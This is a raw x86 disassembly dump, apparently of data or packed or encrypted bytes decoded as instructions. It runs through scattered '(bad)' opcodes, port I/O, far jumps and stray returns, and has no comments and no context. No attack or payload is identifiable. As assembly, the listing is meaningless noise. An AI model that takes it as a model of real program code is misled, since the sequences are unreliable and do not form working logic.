  41d6ff:	rcr    DWORD PTR [ebp+0x467b94fb],cl
  41d705:	push   0x16
  41d707:	add    DWORD PTR [ebp-0x61],edx
  41d70a:	xor    ebp,esp
  41d70c:	push   ds
  41d70d:	int3   
  41d70e:	fdiv   QWORD PTR [eax+0x4e6b774b]
  41d714:	push   ds
  41d715:	push   es
  41d716:	xlat   BYTE PTR ds:[ebx]
  41d717:	test   BYTE PTR fs:[ebx],0x17
  41d71b:	fild   QWORD PTR [ebx+0x42]
  41d71e:	jge    0x41d786
  41d720:	dec    ebp
  41d721:	pop    eax
  41d722:	xchg   edx,eax
  41d723:	ficom  DWORD PTR [eax]
  41d725:	retf   
  41d726:	mov    ?,eax
  41d728:	xchg   edi,eax
  41d729:	push   eax
  41d72a:	xor    bl,bh
  41d72c:	mov    bh,0xf8
  41d72e:	ret    
  41d72f:	repnz xor bl,BYTE PTR [esi-0x70]
  41d733:	into   
  41d734:	jmp    0x41d73f
  41d736:	repnz dec ebx
  41d738:	jecxz  0x41d71f
  41d73a:	mov    ds,WORD PTR [ecx-0x7c]
  41d73d:	xchg   esi,eax
  41d73e:	in     al,dx
  41d73f:	je     0x41d72b
  41d741:	cwde   
  41d742:	or     dl,0x6d
  41d745:	jecxz  0x41d74f
  41d747:	frstor [ecx]
  41d749:	pop    edi
  41d74a:	mov    ecx,0x6267206b
  41d74f:	or     DWORD PTR [edi+0x69],edi
  41d752:	ret    
  41d753:	and    DWORD PTR [edx+0x10],esi
  41d756:	jmp    0xd3723379
  41d75b:	dec    esi
  41d75c:	xor    eax,0xf6fc23a8
  41d761:	(bad)  
  41d762:	int3   
  41d763:	mov    ch,0x6f
  41d765:	imul   edi,ebx,0x7a162bcf
  41d76b:	mov    dl,0xf1
  41d76d:	inc    esp
  41d76e:	dec    edx
  41d76f:	sahf   
  41d770:	add    DWORD PTR [edx+ebp*8-0x26aeee3c],0xa029befd
  41d77b:	inc    esp
  41d77c:	jne    0x41d7a5
  41d77e:	sahf   
  41d77f:	popf   
  41d780:	jge    0x41d77d
  41d782:	loopne 0x41d791
  41d784:	aas    
  41d785:	aas    
  41d786:	push   ds
  41d787:	rcr    BYTE PTR [ecx],0x37
  41d78a:	pop    ecx
  41d78b:	sbb    al,0x55
  41d78d:	rcr    BYTE PTR [ebx+0x5b],cl
  41d790:	icebp  
  41d791:	adc    cl,BYTE PTR [ebx]
  41d793:	ret    
  41d794:	pop    edi
  41d795:	dec    esp
  41d796:	outs   dx,BYTE PTR ds:[esi]
  41d797:	and    al,0x36
  41d799:	mov    esi,0x19206e1e
  41d79e:	sub    ch,cl
  41d7a0:	lahf   
  41d7a1:	jae    0x41d7d0
  41d7a3:	add    esi,esp
  41d7a5:	mov    al,0x40
  41d7a7:	scas   eax,DWORD PTR es:[edi]
  41d7a8:	mov    ch,0x8e
  41d7aa:	push   es
  41d7ab:	mov    ecx,0x3a20b8f0
  41d7b0:	and    ebp,0xffffffa0
  41d7b3:	out    0xcb,al
  41d7b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7b6:	jl     0x41d7d5
  41d7b8:	or     al,0xf8
  41d7ba:	and    BYTE PTR [ebx],bl
  41d7bc:	cdq    
  41d7bd:	cmc    
  41d7be:	push   cs
  41d7bf:	retf   
  41d7c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7c1:	mov    ebp,0x28736af0
  41d7c6:	ja     0x41d7b0
  41d7c8:	retf   
  41d7c9:	jns    0x41d780
  41d7cb:	int    0x25
  41d7cd:	dec    eax
  41d7ce:	mov    esi,0x769c32da
  41d7d3:	jnp    0x41d76f
  41d7d5:	stc    
  41d7d6:	sub    bh,BYTE PTR [edi-0x4b82f0a3]
  41d7dc:	sbb    DWORD PTR [ecx-0x7f57de65],ebx
  41d7e2:	mov    dh,0xd3
  41d7e4:	dec    esp
  41d7e5:	cmc    
  41d7e6:	out    0xa,al
  41d7e8:	sbb    DWORD PTR [esp+edx*1+0x42],ebx
  41d7ec:	mov    ah,0xf3
  41d7ee:	ins    BYTE PTR es:[edi],dx
  41d7ef:	xchg   DWORD PTR [ebx+ebx*1-0x6266a002],esp
  41d7f6:	push   edx
  41d7f7:	fcomp  DWORD PTR [eax+0x6d]
  41d7fa:	push   ebx
  41d7fb:	pop    eax
  41d7fc:	pop    ds
  41d7fd:	pop    edx
  41d7fe:	lock pusha 
  41d800:	mov    BYTE PTR [edi*2-0x5177d6d3],0x2e
  41d808:	xchg   ebp,eax
  41d809:	mov    eax,ds:0x8e411923
  41d80e:	sbb    DWORD PTR ds:0x6b6919b9,esp
  41d814:	or     eax,0x87add06a
  41d819:	clc    
  41d81a:	fstp   QWORD PTR [ebx]
  41d81c:	std    
  41d81d:	in     al,0x82
  41d81f:	imul   esi,DWORD PTR [esi-0x29],0xabefb8d
  41d826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d827:	cwde   
  41d828:	fist   WORD PTR [edi]
  41d82a:	mov    ebp,0x3d9bfe81
  41d82f:	rcr    DWORD PTR [edi-0x5cf90981],1
  41d835:	pop    edx
  41d836:	jl     0x41d800
  41d838:	jns    0x41d833
  41d83a:	js     0x41d7c8
  41d83c:	mov    edx,0x6529f79c
  41d841:	cmp    edi,0x3
  41d844:	dec    ecx
  41d845:	in     al,0x37
  41d847:	jne    0x41d809
  41d849:	pop    esp
  41d84b:	jp     0x41d8b6
  41d84d:	adc    cl,BYTE PTR [edx]
  41d84f:	or     DWORD PTR [edi-0x68],0x3e3f99a4
  41d856:	jae    0x41d8d0
  41d858:	es in  al,dx
  41d85a:	mov    eax,0xcb264cb4
  41d85f:	test   DWORD PTR [ebx],ecx
  41d861:	test   edi,eax
  41d863:	pop    edx
  41d864:	mov    ecx,0x539b9843
  41d869:	sti    
  41d86a:	mov    ebp,0xdc1f4692
  41d86f:	jmp    0x7eb7:0x73193452
  41d876:	mov    esp,0x8d4f0e3e
  41d87b:	lahf   
  41d87c:	pop    esp
  41d87d:	xchg   esp,eax
  41d87e:	test   ecx,edx
  41d880:	sbb    ch,BYTE PTR [ebp-0x70]
  41d883:	fstp   QWORD PTR [esi]
  41d885:	arpl   WORD PTR [ebx-0x77],bx
  41d888:	dec    edx
  41d889:	out    dx,al
  41d88a:	dec    eax
  41d88b:	fdiv   QWORD PTR [esi-0x79]
  41d88e:	lods   al,BYTE PTR ds:[esi]
  41d88f:	dec    eax
  41d890:	lock jmp 0xdc16e025
  41d896:	shr    DWORD PTR [eax+eax*2-0x3c],1
  41d89a:	mov    dh,0x41
  41d89c:	and    ebx,DWORD PTR [edx+0x24]
  41d89f:	popf   
  41d8a0:	js     0x41d891
  41d8a2:	mov    ss:0x7fd3a9f1,al
  41d8a8:	mov    ?,WORD PTR [edi+0xa96a336]
  41d8ae:	ins    BYTE PTR es:[edi],dx
  41d8af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8b0:	es arpl cx,bp
  41d8b3:	in     eax,dx
  41d8b4:	push   edx
  41d8b5:	fdiv   DWORD PTR [esi]
  41d8b7:	jg     0x41d8ee
  41d8b9:	and    al,0x7
  41d8bb:	call   0x13dd:0xcfac
  41d8c1:	and    eax,0x5e8edf39
  41d8c6:	add    bl,BYTE PTR [ebp+0x4e3bee5b]
  41d8cc:	loopne 0x41d87c
  41d8ce:	mov    cl,0x1b
  41d8d0:	mov    ebp,0x2ccaaeb3
  41d8d5:	lds    edi,FWORD PTR [ecx+0xad4e2fc]
  41d8db:	neg    DWORD PTR [esi+eiz*1]
  41d8de:	xchg   ecx,eax
  41d8df:	ins    BYTE PTR es:[edi],dx
  41d8e0:	cmp    eax,0x3214bee2
  41d8e5:	cmp    DWORD PTR [edi+0x6f],0xffffffdf
  41d8e9:	(bad)  
  41d8ea:	jecxz  0x41d8a8
  41d8ec:	jae    0x41d901
  41d8ee:	cld    
  41d8ef:	xchg   BYTE PTR [ebx-0x45],ch
  41d8f2:	inc    edx
  41d8f3:	inc    eax
  41d8f4:	dec    eax
  41d8f5:	loope  0x41d934
  41d8f7:	mov    DWORD PTR [esi-0x380c0843],0xa17960e7
  41d901:	mov    al,ds:0x75d6001b
  41d906:	jmp    0xbf31:0x885f995a
  41d90d:	jle    0x41d903
  41d90f:	add    DWORD PTR [edx+eiz*1+0x421a5c6d],ecx
  41d916:	add    eax,0xb59f9441
  41d91b:	rol    esp,1
  41d91d:	jecxz  0x41d946
  41d91f:	push   0xfe982634
  41d924:	scas   eax,DWORD PTR es:[edi]
  41d925:	fdivr  QWORD PTR [ebp+0x43]
  41d928:	shr    eax,cl
  41d92a:	push   esp
  41d92b:	mov    dh,0x6e
  41d92d:	push   cs
  41d92e:	push   0xffffffbb
  41d930:	jl     0x41d976
  41d932:	mov    esi,esp
  41d934:	mov    eax,ds:0x9545ded8
  41d939:	rol    DWORD PTR [ecx],cl
  41d93b:	ret    0xdd1e
  41d93e:	push   edx
  41d93f:	lahf   
  41d940:	lea    ecx,[esi-0x2a]
  41d943:	add    dl,BYTE PTR [ebx-0x21124e6c]
  41d949:	fst    DWORD PTR ds:0x687fa355
  41d94f:	mov    dh,0x66
  41d951:	inc    edi
  41d952:	cli    
  41d953:	stos   DWORD PTR es:[edi],eax
  41d954:	push   ss
  41d955:	or     edx,DWORD PTR [esi]
  41d957:	ret    0xdf0f
  41d95a:	out    dx,al
  41d95b:	call   0x44f30a57
  41d960:	in     eax,0xc8
  41d962:	shl    BYTE PTR [ebp-0x79715483],cl
  41d968:	mov    edx,0x7905af7e
  41d96d:	shl    DWORD PTR [ecx-0x794ab5e7],cl
  41d973:	in     al,0x95
  41d975:	outs   dx,BYTE PTR ds:[esi]
  41d976:	xlat   BYTE PTR ds:[ebx]
  41d977:	in     al,dx
  41d978:	mov    ds:0x9ac37311,al
  41d97d:	sub    bh,BYTE PTR [ecx-0x1baca77e]
  41d983:	sbb    dl,BYTE PTR [esi]
  41d985:	fidivr WORD PTR [ecx-0x15]
  41d988:	sbb    eax,0x7637c2e7
  41d98d:	add    al,0x82
  41d98f:	adc    esp,DWORD PTR [edi+0x2e314d48]
  41d995:	es dec edx
  41d997:	sbb    al,bl
  41d999:	add    cl,cl
  41d99b:	pop    ebp
  41d99c:	test   BYTE PTR [ebp-0x51],bh
  41d99f:	iret   
  41d9a0:	mov    cl,0xfa
  41d9a2:	inc    edi
  41d9a3:	cmp    al,0xb
  41d9a5:	add    al,0xed
  41d9a7:	jno    0x41d979
  41d9a9:	inc    eax
  41d9aa:	inc    edi
  41d9ab:	test   BYTE PTR cs:[ebx-0x2b],0x79
  41d9b0:	and    eax,0x60ae1872
  41d9b5:	mov    DWORD PTR [ebp+0x78],edx
  41d9b8:	push   es
  41d9b9:	dec    edx
  41d9ba:	or     eax,0xfa3688a8
  41d9bf:	xchg   edx,eax
  41d9c0:	ror    BYTE PTR [ebp-0x7e],cl
  41d9c3:	push   ebp
  41d9c4:	pop    es
  41d9c5:	not    DWORD PTR [edi+0x7503a51]
  41d9cb:	or     al,0xa2
  41d9cd:	imul   edi,DWORD PTR [esi-0x48],0x4541436e
  41d9d4:	(bad)  
  41d9d5:	(bad)  
  41d9d6:	push   esi
  41d9d7:	xor    DWORD PTR [esi],eax
  41d9d9:	xchg   DWORD PTR [eax],eax
  41d9db:	ss jmp 0x1015:0x9c859aa3
  41d9e3:	dec    ecx
  41d9e4:	xor    eax,0x84ff9c02
  41d9e9:	loop   0x41d9d2
  41d9eb:	jae    0x41d9f0
  41d9ed:	inc    esi
  41d9ee:	jle    0x41da4e
  41d9f0:	adc    eax,DWORD PTR [eax-0x1aa0fc96]
  41d9f6:	pushf  
  41d9f7:	ds sbb ebx,esp
  41d9fa:	cmp    eax,0x8b7a1c39
  41d9ff:	imul   ebx,DWORD PTR [ecx+ebp*4+0x54e6ec7e],0xdf49d2d0
  41da0a:	test   al,0x6f
  41da0c:	cmp    edx,DWORD PTR [ecx-0x4bdd1f5c]
  41da12:	(bad)  
  41da13:	sub    DWORD PTR [edx+0x14],ecx
  41da16:	push   esi
  41da17:	dec    ebx
  41da18:	jle    0x41da3d
  41da1a:	xlat   BYTE PTR ds:[ebx]
  41da1b:	out    dx,al
  41da1c:	aaa    
  41da1d:	mov    esi,0x5ef286fb
  41da22:	in     eax,0xa9
  41da24:	and    al,0xa1
  41da26:	jne    0x41daa1
  41da28:	sar    DWORD PTR [eax-0x295297ad],cl
  41da2e:	stos   DWORD PTR es:[edi],eax
  41da2f:	mov    cl,0x21
  41da31:	jnp    0x41d9e5
  41da33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da34:	pusha  
  41da35:	std    
  41da36:	inc    edx
  41da37:	les    ebp,FWORD PTR [ebx+0x3d5c3618]
  41da3d:	(bad)  [edi]
  41da3f:	sub    BYTE PTR [esi+eax*4-0x377bcc69],dl
  41da46:	and    BYTE PTR [ecx+0x67],ch
  41da49:	xor    eax,esi
  41da4b:	jg     0x41da42
  41da4d:	sbb    ah,BYTE PTR [ebx]
  41da4f:	iret   
  41da50:	xor    DWORD PTR [edi],eax
  41da52:	fld    QWORD PTR [ebp-0x63]
  41da55:	cmp    DWORD PTR [ebx-0x35a27547],edi
  41da5b:	cld    
  41da5c:	fdiv   DWORD PTR [ebp+0x48]
  41da5f:	xor    BYTE PTR [ebx],0xed
  41da62:	aad    0x6a
  41da64:	and    edi,esi
  41da66:	(bad)  
  41da67:	loopne 0x41da41
  41da69:	dec    edi
  41da6a:	xor    DWORD PTR [eax-0x45],edx
  41da6d:	xor    eax,0x3a391b62
  41da72:	push   esp
  41da73:	and    al,0x9c
  41da75:	jo     0x41da6d
  41da77:	jmp    DWORD PTR [ebx+0x3f852c2]
  41da7d:	loope  0x41dab5
  41da7f:	std    
  41da80:	cmp    eax,0x91803f61
  41da85:	sbb    DWORD PTR [eax-0x4bf0d843],ebp
  41da8b:	or     bh,BYTE PTR [ecx]
  41da8d:	in     eax,0x83
  41da8f:	and    BYTE PTR fs:[ecx+0x12],cl
  41da93:	stc    
  41da94:	add    al,0xf5
  41da96:	mov    eax,ds:0x868efc59
  41da9b:	fidivr WORD PTR ds:0xff0d5c6a
  41daa1:	fwait
  41daa2:	inc    esp
  41daa3:	int    0xf5
  41daa5:	xchg   DWORD PTR ds:0x112ca018,ebp
  41daab:	retf   
  41daac:	clc    
  41daad:	mov    DWORD PTR [edx-0x74957133],edx
  41dab3:	pop    ecx
  41dab4:	mov    BYTE PTR [ecx+0x21887bd9],bh
  41daba:	fs push ecx
  41dabc:	(bad)  
  41dabe:	sahf   
  41dabf:	adc    eax,0x779919e4
  41dac4:	sbb    bh,ch
  41dac6:	push   esi
  41dac7:	dec    edx
  41dac8:	jge    0x41dab6
  41daca:	test   DWORD PTR [ebp-0x50c5ecbf],eax
  41dad0:	test   al,0x18
  41dad2:	out    dx,eax
  41dad3:	loope  0x41daca
  41dad5:	xor    eax,0xa2b99417
  41dada:	mov    bh,0xd1
  41dadc:	loopne 0x41dab5
  41dade:	jno    0x41db3d
  41dae0:	js     0x41dab3
  41dae2:	mov    eax,ds:0xa05b56a0
  41dae7:	call   0xdeabeaab
  41daec:	loope  0x41db2b
  41daee:	xchg   ebp,eax
  41daef:	js     0x41db05
  41daf1:	inc    ebx
  41daf2:	nop
  41daf3:	fist   DWORD PTR [eax+0x32]
  41daf6:	test   DWORD PTR ds:0x2409ff80,ebx
  41dafc:	ins    BYTE PTR es:[edi],dx
  41dafd:	jo     0x41db0a
  41daff:	shl    DWORD PTR [edi-0x78a0039e],0xf8
  41db06:	cmp    dh,BYTE PTR [esi]
  41db08:	sar    esi,cl
  41db0a:	xor    ebx,edx
  41db0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db0d:	xchg   esi,eax
  41db0e:	cdq    
  41db0f:	cli    
  41db10:	je     0x41db63
  41db12:	mov    ch,0x30
  41db14:	loope  0x41db15
  41db16:	jne    0x41db6c
  41db18:	(bad)  
  41db19:	stc    
  41db1a:	lds    esi,FWORD PTR [ecx-0x66c4a448]
  41db20:	mov    ds,WORD PTR [edi]
  41db22:	adc    al,BYTE PTR [eax+0xd]
  41db25:	pop    edi
  41db26:	add    dh,BYTE PTR [eax]
  41db28:	cld    
  41db29:	outs   dx,BYTE PTR ds:[esi]
  41db2a:	(bad)  
  41db2b:	mov    ah,0x9d
  41db2d:	add    eax,0xb5bedb64
  41db32:	fwait
  41db33:	mov    ds,WORD PTR [eax]
  41db35:	xchg   ebp,eax
  41db36:	pop    ebx
  41db37:	loopne 0x41db1c
  41db39:	or     al,0x17
  41db3b:	mov    ecx,0x8bdc189e
  41db40:	pop    esi
  41db41:	inc    edx
  41db42:	mul    DWORD PTR [eax]
  41db44:	push   ebx
  41db45:	scas   al,BYTE PTR es:[edi]
  41db46:	lds    esp,FWORD PTR [edx-0x752c5159]
  41db4c:	pop    ecx
  41db4d:	mov    ah,0x1
  41db4f:	cmp    DWORD PTR [ecx-0x30],0x1a
  41db53:	les    esp,FWORD PTR ds:0x80543dbb
  41db59:	popf   
  41db5a:	inc    ecx
  41db5b:	sbb    eax,0xfa7daa66
  41db60:	inc    ecx
  41db61:	sub    eax,eax
  41db63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db64:	xchg   esi,eax
  41db65:	scas   al,BYTE PTR es:[edi]
  41db66:	ret    
  41db67:	(bad)  
  41db68:	imul   ebp,DWORD PTR [edx],0xac16dd43
  41db6e:	imul   esp,DWORD PTR [ecx-0x733455d5],0x1e62dbca
  41db78:	rcr    DWORD PTR [edi+eiz*2-0x14c16e7b],0x38
  41db80:	sbb    dh,BYTE PTR [ecx]
  41db82:	sbb    eax,0x443d40ef
  41db87:	retf   0xc930
  41db8a:	retf   0xe364
  41db8d:	jnp    0x41dbcf
  41db8f:	jnp    0x41db85
  41db91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db92:	push   ecx
  41db93:	into   
  41db94:	adc    BYTE PTR [eax-0x7e],dh
  41db97:	arpl   WORD PTR [esi+0x5b50a7bc],dx
  41db9d:	dec    edx
  41db9e:	dec    ecx
  41db9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dba0:	mov    al,ds:0xf9f10fa7
  41dba5:	outs   dx,BYTE PTR ds:[esi]
  41dba6:	xchg   BYTE PTR [edi+eax*2+0x22],dl
  41dbaa:	xor    DWORD PTR [ecx-0xba53b14],ecx
  41dbb0:	std    
  41dbb1:	loope  0x41dc0f
  41dbb3:	imul   ebx,DWORD PTR [edi],0x30
  41dbb6:	jae    0x41db4e
  41dbb8:	jo     0x41db82
  41dbba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbbb:	(bad)  
  41dbbc:	mov    ch,0x7e
  41dbbe:	in     al,dx
  41dbbf:	in     eax,dx
  41dbc0:	stc    
  41dbc1:	rol    BYTE PTR [esi-0x3e],0xcf
  41dbc5:	das    
  41dbc6:	stos   BYTE PTR es:[edi],al
  41dbc7:	aad    0x99
  41dbc9:	nop
  41dbca:	xor    ebx,DWORD PTR [eax]
  41dbcc:	push   0xf8271f43
  41dbd1:	lahf   
  41dbd2:	xchg   ebx,eax
  41dbd3:	pushf  
  41dbd4:	sub    dh,cl
  41dbd6:	cmp    eax,0xc468e981
  41dbdb:	and    DWORD PTR [ecx],eax
  41dbdd:	sbb    eax,0x2212abbf
  41dbe2:	bound  edx,QWORD PTR [ebp-0x6f79e17b]
  41dbe8:	adc    BYTE PTR [esi],al
  41dbea:	lea    ecx,[edx+ebp*4+0x1b]
  41dbee:	fisttp DWORD PTR [eax]
  41dbf0:	in     eax,dx
  41dbf1:	sbb    al,BYTE PTR [edi+0xb5678dc]
  41dbf7:	(bad)  
  41dbf8:	imul   ebx,DWORD PTR [edx+0x69],0xc5356560
  41dbff:	je     0x41dc03
  41dc01:	out    dx,al
  41dc02:	rcpps  xmm6,xmm2
  41dc05:	cld    
  41dc06:	jmp    0x41dba1
  41dc08:	push   ebp
  41dc09:	pop    ebp
  41dc0a:	push   cs
  41dc0b:	dec    edx
  41dc0c:	loop   0x41dbbd
  41dc0e:	or     DWORD PTR [eax],esp
  41dc10:	fucomip st,st(6)
  41dc12:	test   DWORD PTR [edx+0x4ad4b1c0],ecx
  41dc18:	into   
  41dc19:	pop    esp
  41dc1a:	add    eax,0x7b236313
  41dc1f:	(bad)  
  41dc20:	fld    TBYTE PTR [ebx-0x6e]
  41dc23:	and    ebp,DWORD PTR [ebp+ebp*8-0x38]
  41dc27:	outs   dx,DWORD PTR ds:[esi]
  41dc28:	adc    dh,BYTE PTR [ebx+0xe550ff8]
  41dc2e:	fmulp  st(1),st
  41dc30:	cwde   
  41dc31:	cmp    al,0xca
  41dc33:	iret   
  41dc34:	pop    ebp
  41dc35:	clc    
  41dc36:	jb     0x41dc8c
  41dc38:	dec    eax
  41dc39:	stos   DWORD PTR es:[edi],eax
  41dc3a:	jg     0x41dcac
  41dc3c:	adc    DWORD PTR [esi+eax*1-0x6],0xbc7771fc
  41dc44:	xchg   edx,eax
  41dc45:	push   es
  41dc46:	(bad)  
  41dc47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc48:	inc    ebx
  41dc49:	dec    edi
  41dc4a:	push   ds
  41dc4b:	cmc    
  41dc4c:	pushf  
  41dc4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc4e:	jb     0x41dc6d
  41dc50:	jecxz  0x41dc98
  41dc52:	test   DWORD PTR [ebx+0x47b513d1],edx
  41dc58:	pop    ebx
  41dc59:	(bad)  
  41dc5a:	ficomp DWORD PTR [edi]
  41dc5c:	jo     0x41dcb7
  41dc5e:	push   es
  41dc5f:	int    0x29
  41dc61:	or     DWORD PTR [ecx],edx
  41dc63:	mov    ebx,DWORD PTR [edi]
  41dc65:	adc    bl,ah
  41dc67:	jmp    0xea346588
  41dc6c:	aaa    
  41dc6d:	cmp    edi,ebp
  41dc6f:	sub    al,0xc9
  41dc71:	in     al,dx
  41dc72:	mov    ebp,0xa28a0080
  41dc77:	xor    al,0x59
  41dc79:	jne    0x41dc41
  41dc7b:	aad    0x8b
  41dc7d:	mov    ds:0x63a97fa3,al
  41dc82:	xchg   ebx,eax
  41dc83:	mov    ds:0x2855218e,eax
  41dc88:	dec    ebp
  41dc89:	aas    
  41dc8a:	xchg   ebx,eax
  41dc8b:	fbstp  TBYTE PTR [edx]
  41dc8d:	lds    eax,FWORD PTR [edx]
  41dc8f:	cwde   
  41dc90:	mov    al,ds:0x7d2049e5
  41dc95:	mov    ch,0x17
  41dc97:	scas   al,BYTE PTR es:[edi]
  41dc98:	jg     0x41dc7d
  41dc9a:	in     eax,0xb8
  41dc9c:	sub    BYTE PTR fs:[ebp+0x2a],bh
  41dca0:	xor    ebx,DWORD PTR [eax-0x5537c80a]
  41dca6:	enter  0x7d77,0xa0
  41dcaa:	lock or DWORD PTR [edx-0xe],eax
  41dcae:	arpl   di,si
  41dcb0:	mov    edx,0x2fffb2c6
  41dcb5:	push   cs
  41dcb6:	pop    es
  41dcb7:	fs dec ebx
  41dcb9:	dec    esi
  41dcba:	loopne 0x41dd33
  41dcbc:	cs sbb esi,ebp
  41dcbf:	ins    DWORD PTR es:[di],dx
  41dcc1:	dec    ebx
  41dcc2:	int3   
  41dcc3:	fisubr DWORD PTR [edx]
  41dcc5:	sbb    ebp,DWORD PTR [ebp+edx*8+0x1a]
  41dcc9:	inc    ebx
  41dcca:	xor    DWORD PTR [edi],edi
  41dccc:	mov    dh,0x51
  41dcce:	pop    ecx
  41dccf:	out    0xb2,al
  41dcd1:	loope  0x41dd2a
  41dcd3:	retf   
  41dcd4:	aam    0xd4
  41dcd6:	test   cl,dh
  41dcd8:	sar    DWORD PTR [ecx-0x43],0x2e
  41dcdc:	popa   
  41dcdd:	mov    cl,0x77
  41dcdf:	(bad)  
  41dce0:	retf   
  41dce1:	mov    ch,0xef
  41dce3:	aas    
  41dce4:	xchg   ebp,eax
  41dce5:	push   esi
  41dce6:	mov    esi,0xa47495f5
  41dceb:	ret    
  41dcec:	xor    ecx,DWORD PTR [ebx+0x51c8009d]
  41dcf2:	jnp    0x41dcb3
  41dcf4:	mov    edx,0x105c62b8
  41dcf9:	jmp    0x2e3:0xaa21b5ff
  41dd00:	adc    dh,ah
  41dd02:	pop    edx
  41dd03:	jae    0x41dc9b
  41dd05:	aas    
  41dd06:	into   
  41dd07:	push   esp
  41dd08:	call   DWORD PTR [ecx-0x108cc9dd]
  41dd0e:	adc    cl,ch
  41dd10:	xchg   esp,eax
  41dd11:	cmp    cl,BYTE PTR [eax-0x7a]
  41dd14:	inc    edx
  41dd15:	jo     0x41dd3a
  41dd17:	jb     0x41dcfd
  41dd19:	add    BYTE PTR es:[ebx],ch
  41dd1c:	ret    
  41dd1d:	into   
  41dd1e:	jle    0x41dd6e
  41dd20:	cmc    
  41dd21:	idiv   esp
  41dd23:	mov    bl,0x3d
  41dd25:	pop    esp
  41dd26:	adc    DWORD PTR [ebx],esp
  41dd28:	js     0x41dd4f
  41dd2a:	test   eax,0x9f9105ef
  41dd2f:	xchg   ebx,eax
  41dd30:	sub    ebx,DWORD PTR [esi+0x3bbc9868]
  41dd36:	imul   ebx,DWORD PTR [eax+0x1b],0x88e76a34
  41dd3d:	mov    bh,0xd5
  41dd3f:	cmp    DWORD PTR [esi+0x3b],0x55bee91a
  41dd46:	stc    
  41dd47:	or     DWORD PTR [ecx+eax*8],edi
  41dd4a:	stc    
  41dd4b:	dec    ebx
  41dd4c:	adc    ebx,ecx
  41dd4e:	sbb    edx,DWORD PTR [edx-0x704cb564]
  41dd54:	adc    BYTE PTR gs:[ebx+ebx*4+0x452b34a9],al
  41dd5c:	rol    DWORD PTR [esi-0x3f931ee9],1
  41dd62:	and    BYTE PTR [bx+si-0x17d3],dh
  41dd67:	pop    edx
  41dd68:	outs   dx,DWORD PTR ds:[esi]
  41dd69:	loop   0x41dd4e
  41dd6b:	push   ebx
  41dd6c:	jns    0x41dd16
  41dd6e:	stc    
  41dd6f:	push   0xfffffff4
  41dd71:	xchg   ebp,eax
  41dd72:	jns    0x41dd78
  41dd74:	jmp    0x87556bd4
  41dd79:	cmp    DWORD PTR [edi+ecx*4],ebx
  41dd7c:	sbb    al,0xd7
  41dd7e:	dec    edx
  41dd7f:	mov    esi,0x94c7c681
  41dd84:	mov    eax,ds:0xbce544f8
  41dd89:	pop    ds
  41dd8a:	stos   DWORD PTR es:[edi],eax
  41dd8b:	rol    BYTE PTR [ebx-0x75cba59d],1
  41dd91:	ins    DWORD PTR es:[edi],dx
  41dd92:	imul   esp,DWORD PTR [edi],0x2943ea43
  41dd98:	push   es
  41dd99:	cmp    al,0x54
  41dd9b:	scas   al,BYTE PTR es:[edi]
  41dd9c:	rol    BYTE PTR [ecx-0x64],cl
  41dd9f:	mov    esp,0xc19ec472
  41dda4:	(bad)  
  41dda5:	pop    edx
  41dda6:	cmp    dh,ah
  41dda8:	mov    bl,0x9a
  41ddaa:	into   
  41ddab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddac:	jg     0x41dd2e
  41ddae:	fdiv   QWORD PTR [ebx+ebx*8-0x21]
  41ddb2:	hlt    
  41ddb3:	mov    dh,0x36
  41ddb5:	ud2    
  41ddb7:	or     al,0x4
  41ddb9:	or     al,0xba
  41ddbb:	sub    dl,cl
  41ddbd:	ja     0x41dde4
  41ddbf:	jp     0x41ddcd
  41ddc1:	cmp    BYTE PTR [edi],al
  41ddc3:	fbstp  TBYTE PTR [eax-0x65ac587b]
  41ddc9:	enter  0xd0b8,0xad
  41ddcd:	jb     0x41ddc5
  41ddcf:	in     al,0x4
  41ddd1:	jg     0x41ddc2
  41ddd3:	ror    BYTE PTR [edi-0x4490c8ae],0x66
  41ddda:	ret    
  41dddb:	sub    ah,dl
  41dddd:	xchg   ecx,eax
  41ddde:	cdq    
  41dddf:	sub    edx,edi
  41dde1:	and    eax,0x70b8363a
  41dde6:	xor    esi,0xffffff99
  41dde9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddea:	(bad)  
  41ddeb:	test   dh,dl
  41dded:	out    dx,eax
  41ddee:	les    ecx,FWORD PTR [eax-0x26aae120]
  41ddf4:	inc    esi
  41ddf5:	bound  esp,QWORD PTR [esi+esi*2-0x163d8578]
  41ddfc:	scas   al,BYTE PTR es:[edi]
  41ddfd:	xchg   ecx,eax
  41ddfe:	pop    ss
  41ddff:	rol    DWORD PTR [edi+0x36321891],1
  41de05:	test   DWORD PTR cs:[esi],esp
  41de08:	cwde   
  41de09:	or     DWORD PTR [eax+0x3c883cc3],eax
  41de0f:	pop    ss
  41de10:	cmp    eax,0xa3d8a198
  41de15:	pusha  
  41de16:	jne    0x41dddc
  41de18:	sub    DWORD PTR [edi+0x66],ebx
  41de1b:	sbb    al,0x67
  41de1d:	sub    ebp,DWORD PTR [esi]
  41de1f:	or     DWORD PTR ds:0x1a58e2ce,0x3c23a735
  41de29:	loopne 0x41de46
  41de2b:	hlt    
  41de2c:	nop
  41de2d:	in     eax,dx
  41de2e:	sahf   
  41de2f:	xchg   esp,eax
  41de30:	scas   eax,DWORD PTR es:[edi]
  41de31:	gs mov ecx,0x7d990468
  41de37:	fmul   st(6),st
  41de39:	imul   DWORD PTR [esi-0x13]
  41de3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de3d:	pop    es
  41de3e:	pushf  
  41de3f:	xchg   ebp,eax
  41de40:	pop    ebp
  41de41:	inc    ebp
  41de42:	dec    DWORD PTR [ebx]
  41de44:	enter  0x689b,0x2d
  41de48:	inc    ebx
  41de49:	lahf   
  41de4a:	imul   esp,DWORD PTR [edx+ebp*4+0x373ea6f1],0xffffffd2
